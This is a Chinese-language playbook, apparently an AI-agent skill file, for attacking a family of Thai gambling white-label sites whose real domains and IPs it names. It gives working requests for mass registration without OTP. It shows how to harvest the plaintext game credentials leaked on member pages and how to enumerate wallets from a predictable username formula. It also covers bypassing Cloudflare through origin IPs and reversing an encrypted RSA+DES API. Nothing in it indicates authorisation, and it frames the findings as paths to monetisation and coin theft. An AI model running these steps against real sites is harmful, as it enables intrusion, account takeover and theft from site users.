---
name: 商心慈·曼八
description: "mm8bet/GEN泰国Rails白标家族: 注册无OTP→mm88凭据泄露→源站直出→WPS加密API。"
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, gambling, whitelabel, rails, angularjs, mm88, gen]
    category: daaixianzun
---

> **商心慈**
> 心慈不是心手软，账清才能走得远。
> 千门白标同一宗，认族先问商家钱。

# mm8bet/GEN 白标家族渗透（泰国 Rails + AngularJS）

## 触发条件
- 目标特征之一:
  - Cookie `_mm8bet_web_session`（FOFA 可查全家族，实测 3159 站）
  - `x-runtime` 头 + `/assets/users/application-*.js`（Rails + AngularJS 1.5.8）
  - assets 走 `assets.i-newauto.com` / CloudFront `d3vvbkmjp9xzu4.cloudfront.net`
  - 游戏平台 `2hilo-client-d.greenzones.net`（已死）或 MM88 `854819.com:42666` / `www2.854819.com`
  - 标题模式 `{BRAND} | บาคาร่า สล็อต บอล หวย`（泰语博彩）
- 家族成员: ambbet699.com、laolive88.com、wolfbet88、tokyo889、rich88、sparta66、allone999、ytlpower9、mixbet45、tagon69 等

## 核心链路（已验证）
1. **注册无 OTP/邮箱验证** → 批量开号:
   ```
   POST /phones?number=09XXXXXXXX          # 204 任意手机号
   POST /customers (form-urlencoded)       # bank_account_attributes 传 JSON 字符串!
     bank_account_attributes={"bank_id":"1","number_of_digits":10,"number":"<10位唯一号>"}
     + first_name/last_name/password/pass_copy/phone_number/referral
   → {"success":true,"user":{"id":N,"token":"XXX"}}
   GET /login?token=XXX                    # 自动登录
   ```
   ⚠️ `bank_account_attributes` 是 **JSON 字符串**参数，传展开的 `[bank_id]` 嵌套会 500。
2. **member 页明文泄露 MM88 游戏凭据**（每个会员）:
   ```html
   <input id='username' value='88pynne1431'>
   <input id='password' value='Aa{手机号}**'>       ← mm88 密码模式
   <input id='sood_link' value='https://{品牌}.win/login?username=88pynne1431&password=sood1234'>  ← 硬编码 sood1234
   ```
   `GET /member/get_mm88_account?token=` 也返回同套凭据。
3. **mm88 用户名可预测**: `88pynne{user_id - 39998}`（同站前缀固定，41429→1431 验证）→ 用户名+密码模式可枚举全站游戏钱包。
4. **源站直出（CF 绕过）**: FOFA `title="<品牌名>"` 结果里**无域名的裸 IP** 就是源站（如 18.139.49.195），直连可登录（同库会话），无 WAF 限速可高速 fuzz。用首页 size 与 CF 版对比确认（相同 ≈ 同实例）。
5. **提现订单盲创建**（非漏洞，别误报）:
   `POST /member/withdrawals?token&amount&remove_credit_id&before_credit&ip&account_type` 任意金额/任意 remove_credit_id 都返回 `{"success":true}`，订单真实创建，但**处理时按余额校验自动取消**（历史状态 `ยกเลิก`）。remove_credit_id IDOR 不成立。

## 端点表
| 端点 | 说明 |
|---|---|
| `/phones` POST/PUT `/phones/{num}/send_sms` `/phones/{num}/verified?otp=` | 注册 OTP 流；手机记录注册后即删，已注册号 POST 返回 400（OTP 流不可复用） |
| `/customers` | 注册（返回 token） |
| `/login?token=` | token 自动登录 |
| `/member/get_credit_limit?token=` | 余额 |
| `/member/check_credit_limit?token&amount` | 提现前检查（0.01 可通过，50 拒） |
| `/member/withdrawals` POST | 提现订单（盲创建+自动取消） |
| `/member/wallet_withdrawals` POST | MM88 钱包→站内（无钱包 500） |
| `/member/api/withdrawal_crypto` POST | crypto 提现（`before_credit`/`remove_credit_id` 客户端可控，处理时校验） |
| `/member/get_mm88_account?token=` | MM88 凭据+`transfer_money` 状态 |
| `/member/bot_baccarats/{open_table,balance,dealer_event,trend,next_side,add_transaction}` POST | 机器人百家乐，参数只用 `username`（IDOR 面）；无钱包 500/null；**可预测用户名批量扫钱包**（实测 1436 用户名 0 活跃） |
| `/open_card_rewards` `/random_box_rewards` `/fixed_deposit_rewards?fixed_deposit_id=` | 奖励，全需存款条件，并发竞态无果 |
| `/rewards/check_point?phone=` | 积分查询 |
| `/home/api/mk_reports` | 仪表盘数据，**挂死**（000/超时） |
| `/member/api/upload_lao_qr_code` | 上传凭证（QR 校验） |

## WPS 加密 API（MM88/854819 游戏平台）
前端域同源代理 `/wps/*`（如 `https://www.1mm88.com/wps/...`）直通后端（42666 端口直连有 nginx IP 白名单）。加密协议:
- 端点定义在 JS: `{link:"/wps/...", modID, token, encrypt:!0}` — `encrypt:!0` 才加密
- 请求头 `Encryption: <RSA(hex)>`（RSA 加密随机 DES 密钥）+ body `{"value":"<DES(base64)>"}`
- `encrypt.js` 混淆但浏览器 eval 即暴露: `getPulicRsa()`（公钥 hex）、`rsaEncrypt`、`reRsaV2(data)`（**返回 Promise** `{RSA, DES}` — 别 JSON.stringify 直接看，得到 `{}` 是没 await）
- 端点: `/wps/session/login`、`/wps/member/register`、`/wps/v2/wallets/balance`、`/wps/member/info/funds/consolidated`、`/wps/relay/GCS_walletTransfer` 等
- 详见 `references/mm88-wps-protocol.md`

## 硬墙/负结果（别重复耗时间）
- greenzones `2hilo-client-d` 子域 **DNS 全球无解析**；`www.greenzones.net` WAF 403（直连/泰国代理/浏览器全拦）
- MM88 平台 `1mm88.com` 等全商户 `function.not.available`（维护中）；`854819.com` 443 自签、42666 nginx IP 白名单
- 游戏平台停服 = 无活跃钱包 = 无偷币面；全站资金流卡真实存款
- 密码重置走邮箱（手机注册用户无邮箱）
- 平台后台不在租户域/源站/vhost（admin/operator/agent 全 404；agent.mm8bet.com 停放页）
- sood 自动登录 `/login?username=&password=&token=` 实际是 **token 认证**（username/password 摆设）
- FOFA 免费额度有限（F点余额不足/请求速度过快），先想好查询再批量跑

## 交付
- 注册 token + member 凭据泄露 + mm88 用户名公式 + 源站 IP 是主成果（JSON/TSV）
- 报告含: 资产地图（家族站数）、漏洞分级、变现路径分析（如实写卡点）、证据文件清单

## 相关技能
- `whitelabel-gambling-pentest`（eBetLab/LSM99 家族）: 同是多租户白标打法，但技术栈不同（Next.js/Laravel vs Rails/AngularJS）
- `gambling-api-crypto-reversal`（MD5 签名/AES WS）: WPS 是 RSA+DES 变体，协议细节在本技能 references
